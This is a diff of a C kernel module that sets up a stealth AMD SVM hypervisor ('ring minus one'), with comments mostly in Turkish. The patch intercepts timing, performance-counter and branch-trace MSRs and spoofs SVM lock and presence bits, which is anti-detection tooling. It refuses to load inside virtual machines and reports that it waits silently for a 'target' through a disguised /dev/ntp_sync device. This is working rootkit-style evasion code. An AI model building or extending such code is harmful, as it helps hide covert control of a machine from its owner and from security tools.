@@ -1,5 +1,7 @@
 /*
  * main.c — Module Init/Exit + VMCB Prepare (V6.7 Stealth)
+ *
+ *
  */
 
 #include "ring_minus_one.h"
@@ -30,6 +32,33 @@ struct svm_context *g_svm = &svm_ctx;
 struct snap_context *g_snap = &snap_ctx;
 
 /* ═══════════════════════════════════════════════════════════════════════════
+ *  MSRPM Adres Makroları (AMD APM Vol.2 §15.11)
+ *
+ *  MSRPM Layout (toplam 12KB = 3 bölge × 2KB eşleme × 2 bit/MSR):
+ *    Bölge 0: MSR 0x0000_0000 – 0x0000_1FFF  →  offset 0x0000
+ *    Bölge 1: MSR 0xC000_0000 – 0xC000_1FFF  →  offset 0x0800
+ *    Bölge 2: MSR 0xC001_0000 – 0xC001_1FFF  →  offset 0x1000
+ *
+ *  Her MSR için 2 bit: bit0=RDMSR intercept, bit1=WRMSR intercept
+ * ═══════════════════════════════════════════════════════════════════════════
+ */
+#define MSRPM_BYTE_OFF(base, msr)  ((base) + ((msr) & 0x1FFF) * 2 / 8)
+#define MSRPM_BIT_POS(msr)         (((msr) & 0x1FFF) * 2 % 8)
+
+/* Bölge base offset'leri */
+#define MSRPM_BASE_LOW   0x0000  /* 0x0000_0000 – 0x0000_1FFF */
+#define MSRPM_BASE_C000  0x0800  /* 0xC000_0000 – 0xC000_1FFF */
+#define MSRPM_BASE_C001  0x1000  /* 0xC001_0000 – 0xC001_1FFF */
+
+/* Kısayol: rdmsr intercept (bit 0) */
+#define MSRPM_SET_RD(pm, base, msr) \
+    (pm)[MSRPM_BYTE_OFF(base,msr)] |= (1 << MSRPM_BIT_POS(msr))
+
+/* Kısayol: rdmsr + wrmsr intercept (bit 0 + bit 1) */
+#define MSRPM_SET_RW(pm, base, msr) \
+    (pm)[MSRPM_BYTE_OFF(base,msr)] |= (3 << MSRPM_BIT_POS(msr))
+
+/* ═══════════════════════════════════════════════════════════════════════════
  *  VMCB Prepare — V4.0 Stealth Intercepts
  * ═══════════════════════════════════════════════════════════════════════════
  */
@@ -48,7 +77,7 @@ struct snap_context *g_snap = &snap_ctx;
 int vmcb_prepare_npt(struct svm_context *ctx, u64 g_rip, u64 g_rsp, u64 g_cr3) {
   struct vmcb *vmcb = ctx->vmcb;
   struct npt_context *npt = &ctx->npt;
-  u64 efer_val, cr0, cr4, rflags;
+  u64 efer_val, cr0, cr4, rflags, msr_val;
   unsigned long cr3;
   u16 cs, ds, ss, es, fs, gs, tr;
   struct desc_ptr gdtr, idtr;
@@ -98,48 +127,30 @@ int vmcb_prepare_npt(struct svm_context *ctx, u64 g_rip, u64 g_rsp, u64 g_cr3) {
       (1U << (INTERCEPT_RDTSCP & 31));
 #endif
 
-  /* ── MSRPM V4.0: Full timing + syscall MSR coverage ── */
+  /* ── MSRPM V5.0: Macro-Based Addressing (AMD APM Vol.2 §15.11) ── */
   if (ctx->msrpm_va) {
     u8 *msrpm = (u8 *)ctx->msrpm_va;
 
-    /* MSR 0x10 (IA32_TSC): rdmsr */
-    msrpm[(0x10 * 2) / 8] |= (1 << ((0x10 * 2) % 8));
-    /* MSR 0xE7 (IA32_MPERF): rdmsr — CPU freq detection */
-    msrpm[(0xE7 * 2) / 8] |= (1 << ((0xE7 * 2) % 8));
-    /* MSR 0xE8 (IA32_APERF): rdmsr — CPU freq detection */
-    msrpm[(0xE8 * 2) / 8] |= (1 << ((0xE8 * 2) % 8));
-    /* MSR 0x176 (IA32_SYSENTER_EIP): rdmsr */
-    msrpm[(0x176 * 2) / 8] |= (1 << ((0x176 * 2) % 8));
+    /* ── Bölge 0: MSR 0x0000xxxx (Low MSRs) ── */
+    MSRPM_SET_RD(msrpm, MSRPM_BASE_LOW, 0x10);   /* IA32_TSC: rdmsr */
+    MSRPM_SET_RD(msrpm, MSRPM_BASE_LOW, 0xE7);   /* IA32_MPERF: rdmsr */
+    MSRPM_SET_RD(msrpm, MSRPM_BASE_LOW, 0xE8);   /* IA32_APERF: rdmsr */
+    MSRPM_SET_RD(msrpm, MSRPM_BASE_LOW, 0x176);  /* IA32_SYSENTER_EIP: rdmsr */
+    MSRPM_SET_RW(msrpm, MSRPM_BASE_LOW, 0x1D9);  /* IA32_DEBUGCTL: rd+wr (BTS block) */
+    MSRPM_SET_RD(msrpm, MSRPM_BASE_LOW, 0x309);  /* IA32_FIXED_CTR0: rdmsr */
+    MSRPM_SET_RD(msrpm, MSRPM_BASE_LOW, 0x30A);  /* IA32_FIXED_CTR1: rdmsr */
+    MSRPM_SET_RD(msrpm, MSRPM_BASE_LOW, 0x30B);  /* IA32_FIXED_CTR2: rdmsr */
+    MSRPM_SET_RW(msrpm, MSRPM_BASE_LOW, 0x38D);  /* IA32_PERF_FIXED_CTR_CTRL: rd+wr */
+    MSRPM_SET_RW(msrpm, MSRPM_BASE_LOW, 0x38F);  /* IA32_PERF_GLOBAL_CTRL: rd+wr */
 
-    /* AMD Zen 4 MSRPM Change: First block is now 32KB (0x8000), not 2KB (0x800)
-     */
-    /* MSR 0xC0000081 (STAR): rdmsr + wrmsr */
-    msrpm[0x8000 + (0x81 * 2) / 8] |= (3 << ((0x81 * 2) % 8));
-    /* MSR 0xC0000082 (LSTAR): rdmsr + wrmsr */
-    msrpm[0x8000 + (0x82 * 2) / 8] |= (3 << ((0x82 * 2) % 8));
-    /* MSR 0xC0000103 (TSC_AUX): rdmsr */
-    msrpm[0x8000 + (0x103 * 2) / 8] |= (1 << ((0x103 * 2) % 8));
+    /* ── Bölge 1: MSR 0xC000xxxx ── */
+    MSRPM_SET_RW(msrpm, MSRPM_BASE_C000, 0x81);  /* STAR: rd+wr */
+    MSRPM_SET_RW(msrpm, MSRPM_BASE_C000, 0x82);  /* LSTAR: rd+wr */
+    MSRPM_SET_RD(msrpm, MSRPM_BASE_C000, 0x103); /* TSC_AUX: rdmsr */
 
-    /* MSR 0xC0010015 (K8_HWCR): rdmsr — SVME_LOCK spoofing */
-    msrpm[0x8800 + (0x15 * 2) / 8] |= (1 << ((0x15 * 2) % 8));
-
-    /* MSR 0xC0010114 (SVM_LOCK_KEY): rdmsr — SVM presence hiding */
-    msrpm[0x8800 + (0x114 * 2) / 8] |= (1 << ((0x114 * 2) % 8));
-
-    /* ── PMC MSRs: intercept to freeze counters ── */
-    /* MSR 0x38D (IA32_PERF_FIXED_CTR_CTRL): rdmsr+wrmsr */
-    msrpm[(0x38D * 2) / 8] |= (3 << ((0x38D * 2) % 8));
-    /* MSR 0x38F (IA32_PERF_GLOBAL_CTRL): rdmsr+wrmsr */
-    msrpm[(0x38F * 2) / 8] |= (3 << ((0x38F * 2) % 8));
-    /* MSR 0x309 (IA32_FIXED_CTR0): rdmsr */
-    msrpm[(0x309 * 2) / 8] |= (1 << ((0x309 * 2) % 8));
-    /* MSR 0x30A (IA32_FIXED_CTR1): rdmsr */
-    msrpm[(0x30A * 2) / 8] |= (1 << ((0x30A * 2) % 8));
-    /* MSR 0x30B (IA32_FIXED_CTR2): rdmsr */
-    msrpm[(0x30B * 2) / 8] |= (1 << ((0x30B * 2) % 8));
-
-    /* ── BTS: IA32_DEBUGCTL (0x1D9) — block Branch Trace Store ── */
-    msrpm[(0x1D9 * 2) / 8] |= (3 << ((0x1D9 * 2) % 8));
+    /* ── Bölge 2: MSR 0xC001xxxx ── */
+    MSRPM_SET_RD(msrpm, MSRPM_BASE_C001, 0x15);  /* K8_HWCR (0xC0010015): SVME_LOCK spoofing */
+    MSRPM_SET_RD(msrpm, MSRPM_BASE_C001, 0x114); /* SVM_LOCK_KEY (0xC0010114): SVM hiding */
   }
 
   /* ── IOPM: Timer I/O port coverage ── */
@@ -170,19 +181,82 @@ int vmcb_prepare_npt(struct svm_context *ctx, u64 g_rip, u64 g_rsp, u64 g_cr3) {
   /* First VMRUN: clean=0 forces full load. Subsequent runs use STABLE. */
   vmcb->control.clean = 0;
 
-  /* NPT configuration */
-  if (npt && npt->pml4_pa && pfn_valid(npt->pml4_pa >> PAGE_SHIFT)) {
+  /* NPT configuration — Strengthened validation (Security Fix #2) */
+  if (npt && npt->pml4_pa && 
+      IS_ALIGNED(npt->pml4_pa, PAGE_SIZE) &&
+      pfn_valid(npt->pml4_pa >> PAGE_SHIFT) &&
+      npt->pml4 != NULL) {
     vmcb->control.nested_ctl = 1;
     vmcb->control.nested_cr3 = npt->pml4_pa;
     pr_info("[VMCB] NPT enabled, nested_cr3=0x%llx\n", (u64)npt->pml4_pa);
   } else {
-    pr_err("[VMCB] CRITICAL: Invalid NPT PML4 %llx. Disabling NPT.\n",
-           npt ? (u64)npt->pml4_pa : 0);
+    pr_err("[VMCB] CRITICAL: Invalid NPT PML4 pa=%llx virt=%px. Aborting VMRUN.\n",
+           npt ? (u64)npt->pml4_pa : 0, npt ? npt->pml4 : NULL);
     vmcb->control.nested_ctl = 0;
+    return -EINVAL; /* Do NOT allow VMRUN with broken page tables */
   }
 
   /* TSC offset — per-CPU */
   vmcb->control.tsc_offset = *this_cpu_ptr(&pcpu_tsc_offset);
+
+  /* MSR Kopyalamaları: Host -> Guest */
+  rdmsrl(MSR_STAR, msr_val);
+  vmcb->save.star = msr_val;
+  rdmsrl(MSR_LSTAR, msr_val);
+  vmcb->save.lstar = msr_val;
+  rdmsrl(MSR_CSTAR, msr_val);
+  vmcb->save.cstar = msr_val;
+  rdmsrl(MSR_SYSCALL_MASK, msr_val);
+  vmcb->save.sfmask = msr_val;
+  rdmsrl(MSR_KERNEL_GS_BASE, msr_val);
+  vmcb->save.kernel_gs_base = msr_val;
+  rdmsrl(MSR_FS_BASE, msr_val);
+  vmcb->save.fs.base = msr_val;
+  rdmsrl(MSR_GS_BASE, msr_val);
+  vmcb->save.gs.base = msr_val;
+
+  /* EFER Register - SVME Enable and Disable SCE (SYSCALL) to catch transitions
+   */
+  rdmsrl(MSR_EFER, msr_val);
+  vmcb->save.efer = (msr_val | EFER_SVME) & ~EFER_SCE;
+
+  /* TR (Task Register) - Triple Fault Fix (Security Fix #3)
+   * 64-bit TSS descriptor = 16 byte (desc[0..3]), Intel/AMD SDM Vol.3 §7.2.3
+   */
+  {
+    u16 tr_sel;
+    struct desc_ptr dt;
+    native_store_gdt(&dt);
+    asm volatile("str %0" : "=m"(tr_sel));
+    vmcb->save.tr.selector = tr_sel;
+
+    if (dt.address && tr_sel && (tr_sel + 15 <= dt.size)) {
+      u8 *gdt = (u8 *)dt.address;
+      u32 d0 = ((u32 *)(gdt + tr_sel))[0];
+      u32 d1 = ((u32 *)(gdt + tr_sel))[1];
+      u32 d2 = ((u32 *)(gdt + tr_sel))[2]; /* upper 32-bit of base (64-bit mode) */
+
+      /* Base: bits[15:0] from d0[31:16], bits[23:16] from d1[7:0], bits[31:24] from d1[31:24] */
+      u64 base = ((d0 >> 16) & 0xFFFF)
+              | (((u64)(d1 & 0xFF)) << 16)
+              | (((u64)(d1 & 0xFF000000)))
+              | (((u64)d2) << 32);
+
+      /* Limit: bits[15:0] from d0[15:0], bits[19:16] from d1[19:16] */
+      u32 limit = (d0 & 0xFFFF) | (d1 & 0x000F0000);
+      if (d1 & (1 << 23)) /* Granularity */
+        limit = (limit << 12) | 0xFFF;
+
+      vmcb->save.tr.base  = base;
+      vmcb->save.tr.limit = limit;
+    } else {
+      pr_warn("[VMCB] TR selector invalid (sel=0x%x, gdt.addr=%lx, gdt.size=%u)\n",
+              tr_sel, dt.address, dt.size);
+      vmcb->save.tr.base  = 0;
+      vmcb->save.tr.limit = 0xFFFF;
+    }
+    vmcb->save.tr.attrib = 0x0089; /* Type=0x9 (Available 64-bit TSS), P=1 */
+  }
 
   /* ── Segment Registers ── */
   vmcb->save.cs.selector = cs;
@@ -208,8 +282,6 @@ int vmcb_prepare_npt(struct svm_context *ctx, u64 g_rip, u64 g_rsp, u64 g_cr3) {
   vmcb->save.fs.selector = fs;
   vmcb->save.fs.attrib = 0x0093;
   vmcb->save.fs.limit = 0xFFFFFFFF;
-  vmcb->save.fs.base = fs_base;
-
   vmcb->save.gs.selector = gs;
   vmcb->save.gs.attrib = 0x0093;
   vmcb->save.gs.limit = 0xFFFFFFFF;
@@ -270,7 +342,8 @@ static int __init svm_module_init(void) {
   int ret;
   u32 eax, ebx, ecx, edx;
 
-  /* Phase 3.3 Patch: Pin initialization to CPU 0 to prevent MSR fragmentation (#UD invalid opcode on CLGI) */
+  /* Phase 3.3 Patch: Pin initialization to CPU 0 to prevent MSR fragmentation
+   * (#UD invalid opcode on CLGI) */
   set_cpus_allowed_ptr(current, cpumask_of(0));
 
   pr_info("=== SVM Modülü Başlatılıyor ===\n");
@@ -278,8 +351,9 @@ static int __init svm_module_init(void) {
   /* 0) KVM (Hypervisor) Varlık Testi */
   cpuid(1, &eax, &ebx, &ecx, &edx);
   if (ecx & (1 << 31)) {
-    pr_err("KRITIK HATA: KVM / Sanal Makine Tespit Edildi (CPUID.1:ECX.31 = 1). "
-           "Modül sadece Bare-Metal'de çalıştırılabilir. Yükleme iptal edildi!\n");
+    pr_err(
+        "KRITIK HATA: KVM / Sanal Makine Tespit Edildi (CPUID.1:ECX.31 = 1). "
+        "Modül sadece Bare-Metal'de çalıştırılabilir. Yükleme iptal edildi!\n");
     return -EBUSY;
   }
 
@@ -378,7 +452,6 @@ static int __init svm_module_init(void) {
   pr_info(">>> BAŞARILI! Modül arka planda sessizce /dev/ntp_sync üzerinden "
           "hedef bekliyor <<<\n");
   return 0;
-
 
 err_msrpm:
   if (svm_ctx.msrpm_va) {
